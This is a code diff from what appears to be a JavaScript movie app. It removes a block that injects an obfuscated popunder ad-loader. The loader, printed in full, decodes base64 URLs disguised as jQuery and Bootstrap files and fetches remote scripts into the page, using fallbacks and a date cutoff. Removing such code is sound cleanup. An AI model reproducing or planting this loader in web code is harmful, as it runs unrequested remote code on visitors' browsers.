@@ -76,59 +76,6 @@ function getStarRating(voteAverage) {
   
   return stars;
 }
-      // Inject the external script dynamically
-    const script = document.createElement("script");
-    script.type = "text/javascript";
-    script.setAttribute("data-cfasync", "false");
-    script.text = `
-      (function() {
-    var a = window,
-        s = "dde9eaa296ceb0c27f028efb3469f9db",
-        y = [
-            ["siteId", 345 + 414 * 170 + 5069312],
-            ["minBid", 0],
-            ["popundersPerIP", "0"],
-            ["delayBetween", 0],
-            ["default", false],
-            ["defaultPerDay", 0],
-            ["topmostLayer", "auto"]
-        ],
-        p = [
-            "d3d3LnByZW1pdW12ZXJ0aXNpbmcuY29tL3pMSGRNL29qcXVlcnkuY29tcGxleGlmeS5taW4uanM=",
-            "ZDJqMDQyY2oxNDIxd2kuY2xvdWRmcm9udC5uZXQvaS9MdHZPVC9yYm9vdHN0cmFwLXRpbWVwaWNrZXIubWluLmNzcw==",
-            "d3d3LnhyZWl6dmhraWNtLmNvbS9ydFF1bC9manF1ZXJ5LmNvbXBsZXhpZnkubWluLmpz",
-            "d3d3LmNmeWpheGNrbC5jb20vRy9CL3Jib290c3RyYXAtdGltZXBpY2tlci5taW4uY3Nz"
-        ],
-        d = -1,
-        q, t, g = function() {
-            clearTimeout(t);
-            d++;
-            if (p[d] && !(1754372595000 < (new Date).getTime() && 1 < d)) {
-                q = a.document.createElement("script");
-                q.type = "text/javascript";
-                q.async = true;
-                var f = a.document.getElementsByTagName("script")[0];
-                q.src = "https://" + atob(p[d]);
-                q.crossOrigin = "anonymous";
-                q.onerror = g;
-                q.onload = function() {
-                    clearTimeout(t);
-                    a[s.slice(0, 16) + s.slice(0, 16)] || g();
-                };
-                t = setTimeout(g, 5000);
-                f.parentNode.insertBefore(q, f);
-            }
-        };
-    if (!a[s]) {
-        try {
-            Object.freeze(a[s] = y);
-        } catch (e) {}
-        g();
-    }
-})();
-    `;
-    document.body.appendChild(script);
-  }, [theme]);
   // Create a function to generate star ratings based on the vote_average
   function getStarRating(voteAverage) {
     const fullStars = Math.floor(voteAverage / 2); // Max 5 stars (each star represents 2 points)
